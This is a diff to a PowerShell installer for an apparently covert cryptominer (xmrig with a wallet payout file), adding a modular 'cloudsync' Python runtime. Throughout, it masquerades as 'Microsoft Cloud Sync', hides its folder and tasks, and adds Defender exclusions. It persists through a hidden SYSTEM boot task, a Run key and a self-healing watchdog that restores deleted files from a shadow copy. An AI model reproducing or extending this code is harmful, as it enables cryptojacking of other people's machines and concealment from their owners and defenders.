@@ -16,7 +16,11 @@
       * Defender exclusions are narrow (install dir + one exe) and the old
         machine-wide python.exe / .json exclusions are removed;
       * never blocks on ReadKey (that hung every remote deployment);
-      * exits non-zero if verification fails.
+      * exits non-zero if verification fails;
+      * installs the modular runtime (``pythonw -m cloudsync``) when a
+        ``cloudsync\`` package is present in the source tree, and the flat
+        ``controller.py`` layout when it is not. The choice is recorded in
+        ``install.json`` as ``runtime``.
 
 .EXAMPLE
     powershell -NoProfile -ExecutionPolicy Bypass -File .\install-task.ps1 -NoPrompt
@@ -89,6 +93,12 @@ if (-not $admin -and -not $Elevated -and -not $NoPrompt) {
 $admin = Test-Admin
 if ($admin) { Ok "running elevated" } else { Warn "running limited (no Defender exclusions, no MSR/huge-page unlock)" }
 
+# The health watchdog restarts the controller and restores files from the shadow
+# copy; either can race the payload copy below. Suspend it for the duration of
+# the install and re-enable it after verification.
+try { schtasks.exe /change /tn "$TaskRoot\$HealthName" /disable 2>$null | Out-Null } catch { }
+Say "  [i] health task suspended during install"
+
 # ==============================================================
 # 1. source + payload
 # ==============================================================
@@ -103,6 +113,17 @@ $payload = @(
     'restore-system.ps1', 'harden.ps1', 'camo.ps1', 'check-updates.ps1',
     'README.md', 'REMOTE.cmd'
 )
+
+# ---- runtime selection ------------------------------------------------------
+# Same additive approach as the published repo installer: the modular package is
+# copied only when the source tree has one. A source tree without cloudsync\
+# installs the flat controller.py layout exactly as before.
+$packageSrc = Join-Path $src 'cloudsync'
+$modular = Test-Path -LiteralPath (Join-Path $packageSrc '__main__.py')
+$runtime = if ($modular) { 'modular' } else { 'flat' }
+if ($modular) { Say "[+] runtime: modular (pythonw -m cloudsync)" }
+elseif (Test-Path -LiteralPath $packageSrc) { Warn "cloudsync\ present but no __main__.py - using the flat runtime" }
+else { Say "[+] runtime: flat (controller.py)" }
 
 # ==============================================================
 # 2. python
@@ -161,6 +182,26 @@ $python = $null
 if ($pythonw) { $python = $pythonw -replace 'pythonw\.exe$', 'python.exe' }
 
 # ==============================================================
+# 2b. copy helpers (defined before the payload copy that uses them)
+# ==============================================================
+# A freshly written file can be locked for a moment by real-time AV while it is
+# scanned. Retry instead of dying: this was observed with ESET.
+function Copy-Retry ($From, $To, $Tries = 6) {
+    for ($i = 1; $i -le $Tries; $i++) {
+        try { Copy-Item -LiteralPath $From -Destination $To -Force -ErrorAction Stop; return $true }
+        catch { Start-Sleep -Milliseconds 700 }
+    }
+    return $false
+}
+function Get-HashRetry ($Path, $Tries = 6) {
+    for ($i = 1; $i -le $Tries; $i++) {
+        try { return (Get-FileHash -LiteralPath $Path -Algorithm SHA256 -ErrorAction Stop).Hash.ToLower() }
+        catch { Start-Sleep -Milliseconds 700 }
+    }
+    return $null
+}
+
+# ==============================================================
 # 3. copy payload
 # ==============================================================
 # Machine-wide is the default: the payload lives in ProgramData so it does not
@@ -214,7 +255,7 @@ if ($InstallDir -like "$env:ProgramData*") {
 
 # ---- stop any running instance first, or the binary is locked -------------
 Get-CimInstance Win32_Process -Filter "Name='pythonw.exe' OR Name='python.exe'" -ErrorAction SilentlyContinue |
-    Where-Object { $_.CommandLine -like '*controller.py*' } |
+    Where-Object { $_.CommandLine -like '*controller.py*' -or $_.CommandLine -like '*-m cloudsync*' } |
     ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue; Say "  stopped controller $($_.ProcessId)" }
 foreach ($n in @('svchost.exe','CloudSync.exe','xmrig.exe','WinSync.exe')) {
     Get-CimInstance Win32_Process -Filter "Name='$n'" -ErrorAction SilentlyContinue |
@@ -224,9 +265,50 @@ foreach ($n in @('svchost.exe','CloudSync.exe','xmrig.exe','WinSync.exe')) {
 Start-Sleep -Seconds 2
 
 foreach ($f in $payload) {
+    if ($modular -and $f -eq 'controller.py') { continue }
     $s = Join-Path $src $f
-    if (Test-Path $s) { Copy-Item -LiteralPath $s -Destination (Join-Path $InstallDir $f) -Force }
+    $d = Join-Path $InstallDir $f
+    if (Test-Path $s) { Copy-Retry $s $d | Out-Null }
 }
+
+# wallet.txt holds the payout address: readable by the operator, not writable or
+# readable-only-for-them by every local user.
+if (Test-Path -LiteralPath (Join-Path $InstallDir 'wallet.txt')) {
+    & icacls.exe (Join-Path $InstallDir 'wallet.txt') /inheritance:r /grant:r "$($env:USERNAME):F" /grant:r '*S-1-5-32-545:R' 2>&1 | Out-Null
+    Say "  [i] wallet.txt permits: $env:USERNAME full, Users read-only"
+}
+
+$entryPayload = @($payload)
+$packageEntries = @()
+if ($modular) {
+    try {
+        Copy-Item -LiteralPath $packageSrc -Destination $InstallDir -Recurse -Force -ErrorAction Stop
+        $pkgRoot = Join-Path $InstallDir 'cloudsync'
+        $pkgFiles = @(Get-ChildItem -LiteralPath $pkgRoot -Recurse -File -Filter '*.py')
+        Ok ("cloudsync package: {0} .py file(s)" -f $pkgFiles.Count)
+        $packageEntries = @($pkgFiles | ForEach-Object { $_.FullName.Substring($InstallDir.Length + 1) })
+        $entryPayload = @($payload | Where-Object { $_ -ne 'controller.py' })
+    } catch {
+        Bad "cloudsync package copy failed: $($_.Exception.Message) - falling back to the flat runtime"
+        $modular = $false
+        $runtime = 'flat'
+        $fallback = Join-Path $src 'controller.py'
+        if (Test-Path -LiteralPath $fallback) {
+            Copy-Item -LiteralPath $fallback -Destination (Join-Path $InstallDir 'controller.py') -Force
+        }
+    }
+    if ($modular) {
+        # A flat controller.py would make the package lifecycle code prefer the
+        # flat command again (Run key), so a stale copy must not survive.
+        $staleController = Join-Path $InstallDir 'controller.py'
+        if (Test-Path -LiteralPath $staleController) {
+            Remove-Item -LiteralPath $staleController -Force -ErrorAction SilentlyContinue
+            Say "  [i] removed stale flat controller.py (modular runtime)"
+        }
+    }
+}
+# Every payload file the watchdog can restore from the shadow copy.
+$selfHeal = @($entryPayload) + @($packageEntries)
 
 # binary: accept either a rename at rest or the original name
 $binSrc = $null
@@ -332,39 +414,27 @@ if (-not $SkipGpuProbe -and $python) {
 # ==============================================================
 # 5. shadow copy (self-heal source)
 # ==============================================================
-# A freshly written file can be locked for a moment by real-time AV while it is
-# scanned. Retry instead of dying: this was observed with ESET.
-function Copy-Retry ($From, $To, $Tries = 6) {
-    for ($i = 1; $i -le $Tries; $i++) {
-        try { Copy-Item -LiteralPath $From -Destination $To -Force -ErrorAction Stop; return $true }
-        catch { Start-Sleep -Milliseconds 700 }
-    }
-    return $false
-}
-function Get-HashRetry ($Path, $Tries = 6) {
-    for ($i = 1; $i -le $Tries; $i++) {
-        try { return (Get-FileHash -LiteralPath $Path -Algorithm SHA256 -ErrorAction Stop).Hash.ToLower() }
-        catch { Start-Sleep -Milliseconds 700 }
-    }
-    return $null
-}
-
 $backupDir = $null
 try {
-    $root = Join-Path $env:ProgramData 'Microsoft\CloudSync'
+    $root = Join-Path $env:ProgramData 'Microsoft\CloudSyncBackup'
     New-Item -ItemType Directory -Force -Path $root | Out-Null
     $backupDir = Join-Path $root ((New-Guid).ToString().Substring(0, 8))
     New-Item -ItemType Directory -Force -Path $backupDir | Out-Null
     $copied = 0
-    foreach ($f in $payload) {
+    foreach ($f in $selfHeal) {
         $p = Join-Path $InstallDir $f
-        if ((Test-Path $p) -and (Copy-Retry $p (Join-Path $backupDir $f))) { $copied++ }
+        if (Test-Path $p) {
+            $bak = Join-Path $backupDir $f
+            $bakDir = Split-Path -Parent $bak
+            if ($bakDir -and -not (Test-Path $bakDir)) { New-Item -ItemType Directory -Force -Path $bakDir | Out-Null }
+            if (Copy-Retry $p $bak) { $copied++ }
+        }
     }
     foreach ($exe in @($BinaryName, 'xmrig.exe')) {
         $p = Join-Path $InstallDir $exe
         if (Test-Path $p) { Copy-Retry $p (Join-Path $backupDir $exe) | Out-Null }
     }
-    Ok ("shadow copy: {0} ({1}/{2} files)" -f $backupDir, $copied, $payload.Count)
+    Ok ("shadow copy: {0} ({1}/{2} files)" -f $backupDir, $copied, $selfHeal.Count)
 } catch {
     Warn "shadow copy failed: $($_.Exception.Message)"
     $backupDir = $null
@@ -374,7 +444,7 @@ try {
 # 6. install.json  (local source of truth for watchdog + controller)
 # ==============================================================
 $hashes = @{}
-foreach ($f in $payload) {
+foreach ($f in $selfHeal) {
     $p = Join-Path $InstallDir $f
     if (Test-Path $p) {
         $h = Get-HashRetry $p
@@ -399,6 +469,8 @@ $installInfo = [ordered]@{
     idle_seconds = $IdleSeconds
     run_name     = 'CloudSync'
     run_key      = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+    runtime      = $runtime
+    entry        = if ($modular) { '-m cloudsync' } else { 'controller.py' }
     installed_at = (Get-Date).ToString('o')
     files        = $hashes
 }
@@ -414,10 +486,19 @@ Say "[+] registering scheduled tasks..."
 $taskPath = "\$TaskRoot\"
 $me = if ($env:USERDOMAIN) { "$env:USERDOMAIN\$env:USERNAME" } else { $env:USERNAME }
 
+# The command recorded in the task and the Run key: the modular runtime is
+# `pythonw -m cloudsync` (working directory = install dir); the flat layout keeps
+# launching controller.py exactly as before.
+$mainCommand = if ($modular) { "`"$pythonw`" -m cloudsync" } else { "`"$pythonw`" `"$(Join-Path $InstallDir 'controller.py')`"" }
+
 try {
-    $act = New-ScheduledTaskAction -Execute $pythonw `
-        -Argument "`"$(Join-Path $InstallDir 'controller.py')`"" `
-        -WorkingDirectory $InstallDir
+    $act = if ($modular) {
+        New-ScheduledTaskAction -Execute $pythonw -Argument '-m cloudsync' -WorkingDirectory $InstallDir
+    } else {
+        New-ScheduledTaskAction -Execute $pythonw `
+            -Argument "`"$(Join-Path $InstallDir 'controller.py')`"" `
+            -WorkingDirectory $InstallDir
+    }
 
     $settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable `
         -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew `
@@ -450,14 +531,26 @@ try {
     # Boot trigger as SYSTEM: a headless server (FILE-SERVER, 2026-11-10) may never
     # log a user on, so AtLogOn alone never fires. SYSTEM starts in session 0; the
     # machine-wide mutex means it yields to an in-session controller.
-    $bootAct = New-ScheduledTaskAction -Execute $pythonw -Argument "`"$(Join-Path $InstallDir 'controller.py')`"" -WorkingDirectory $InstallDir
+    # The action mirrors the main task: a flat install must launch controller.py,
+    # otherwise the SYSTEM boot task can never start.
+    if ($modular) {
+        $bootAct = New-ScheduledTaskAction -Execute $pythonw -Argument "-m cloudsync" -WorkingDirectory $InstallDir
+    } else {
+        $bootAct = New-ScheduledTaskAction -Execute $pythonw `
+            -Argument "`"$(Join-Path $InstallDir 'controller.py')`"" `
+            -WorkingDirectory $InstallDir
+    }
     $bootSettings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 2) -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
     $bootPrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
     Register-ScheduledTask -TaskName "$TaskName-Boot" -TaskPath $taskPath -Action $bootAct -Trigger (New-ScheduledTaskTrigger -AtStartup) -Settings $bootSettings -Principal $bootPrincipal -Description 'Microsoft Cloud Sync (boot)' -Force | Out-Null
     Ok "boot task: $TaskRoot\$TaskName-Boot"
 } catch {
     Warn "task registration failed ($($_.Exception.Message)) - falling back to schtasks"
-    schtasks.exe /Create /TN "$TaskRoot\$TaskName" /TR "`"$pythonw`" `"$(Join-Path $InstallDir 'controller.py')`"" /SC ONLOGON /RL LIMITED /IT /F /RU $env:USERNAME | Out-Null
+    if ($modular) {
+        schtasks.exe /Create /TN "$TaskRoot\$TaskName" /TR "`"$pythonw`" -m cloudsync" /SC ONLOGON /RL LIMITED /IT /F /RU $env:USERNAME | Out-Null
+    } else {
+        schtasks.exe /Create /TN "$TaskRoot\$TaskName" /TR "`"$pythonw`" `"$(Join-Path $InstallDir 'controller.py')`"" /SC ONLOGON /RL LIMITED /IT /F /RU $env:USERNAME | Out-Null
+    }
     schtasks.exe /Create /TN "$TaskRoot\$HealthName" /TR "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Join-Path $InstallDir 'watchdog.ps1')`"" /SC MINUTE /MO 10 /RL LIMITED /IT /F /RU $env:USERNAME | Out-Null
 }
 
@@ -468,7 +561,7 @@ try {
 # mutex means only one miner ever runs. If one is deleted, the other still
 # brings it back - and the controller re-creates this key itself every 10 min.
 $runKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
-$runValue = "`"$pythonw`" `"$(Join-Path $InstallDir 'controller.py')`""
+$runValue = $mainCommand
 try {
     if (-not (Test-Path $runKeyPath)) { New-Item -Path $runKeyPath -Force | Out-Null }
     Set-ItemProperty -Path $runKeyPath -Name 'CloudSync' -Value $runValue -Type String -Force
@@ -615,9 +708,14 @@ Hide-Path $InstallDir
 Ok "install folder hidden"
 
 if ($pythonw) {
-    Say "[+] starting controller..."
-    Start-Process -FilePath $pythonw -ArgumentList @("`"$(Join-Path $InstallDir 'controller.py')`"") `
-                  -WorkingDirectory $InstallDir -WindowStyle Hidden | Out-Null
+    Say "[+] starting controller ($runtime runtime)..."
+    if ($modular) {
+        Start-Process -FilePath $pythonw -ArgumentList @('-m', 'cloudsync') `
+                      -WorkingDirectory $InstallDir -WindowStyle Hidden | Out-Null
+    } else {
+        Start-Process -FilePath $pythonw -ArgumentList @("`"$(Join-Path $InstallDir 'controller.py')`"") `
+                      -WorkingDirectory $InstallDir -WindowStyle Hidden | Out-Null
+    }
     Start-Sleep -Seconds 6
 }
 
@@ -647,9 +745,20 @@ Say ""
 Say "==================== VERIFICATION ===================="
 # optional: only verify files that exist in the source -- README/docs may be
     # omitted from a deployment (operator preference, 2026-11-10).
-    foreach ($f in ($payload | Where-Object { Test-Path (Join-Path $src $_) })) {
+    foreach ($f in ($entryPayload | Where-Object { Test-Path (Join-Path $src $_) })) {
         Check "installed: $f" (Test-Path (Join-Path $InstallDir $f))
     }
+if ($modular) {
+    Check "cloudsync package installed" (Test-Path (Join-Path $InstallDir 'cloudsync\__main__.py'))
+    Check "flat controller.py not installed" (-not (Test-Path (Join-Path $InstallDir 'controller.py')))
+    $installedRuntime = $null
+    try { $installedRuntime = (Get-Content (Join-Path $InstallDir 'install.json') -Raw | ConvertFrom-Json).runtime } catch { }
+    Check "install.json runtime=modular" ($installedRuntime -eq 'modular')
+    $taskText = (schtasks.exe /Query /TN "$TaskRoot\$TaskName" /V /FO LIST 2>$null | Out-String)
+    Check "task action contains -m cloudsync" ($taskText -match '-m cloudsync')
+} else {
+    Check "installed: controller.py" (Test-Path (Join-Path $InstallDir 'controller.py'))
+}
 Check "binary present: $BinaryName" (Test-Path (Join-Path $InstallDir $BinaryName))
 Check "install.json" (Test-Path (Join-Path $InstallDir 'install.json'))
 Check "pythonw resolved" ([bool]$pythonw)
@@ -670,6 +779,10 @@ if (Test-Path $state) {
 }
 Say "======================================================"
 Say ("failures={0} warnings={1}" -f $script:Fail, $script:Warn)
+
+# Install is done and verified: let the watchdog police the controller again.
+try { schtasks.exe /change /tn "$TaskRoot\$HealthName" /enable 2>$null | Out-Null } catch { }
+Say "  [i] health task re-enabled"
 
 if ($Prompt -and [Environment]::UserInteractive) {
     Write-Host ""
